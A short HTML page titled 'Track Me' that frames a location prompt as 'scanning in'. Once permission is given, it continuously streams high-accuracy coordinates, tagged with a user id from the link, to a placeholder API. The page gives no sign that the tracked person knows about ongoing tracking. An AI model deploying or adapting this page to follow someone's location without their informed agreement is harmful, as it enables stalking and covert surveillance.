<!DOCTYPE html>
<html>
<head>
  <title>Track Me</title>
</head>
<body>
  <h1>üìç Location Access</h1>
  <p>Scanning in... Please allow location access.</p>

  <script>
    const userId = new URLSearchParams(window.location.search).get('u') || 'user0';
    function send(pos) {
      fetch('https://your-api-url.com/locatie', { 
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          userId,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        })
      });
    }

    function startTracking() {
      if (!navigator.geolocation) {
        alert('Geolocation not supported!');
        return;
      }
      navigator.geolocation.watchPosition(send, err => {
        alert('You must allow location access!');
      }, { enableHighAccuracy:true });
    }

    window.onload = startTracking;
  </script>
</body>
</html>
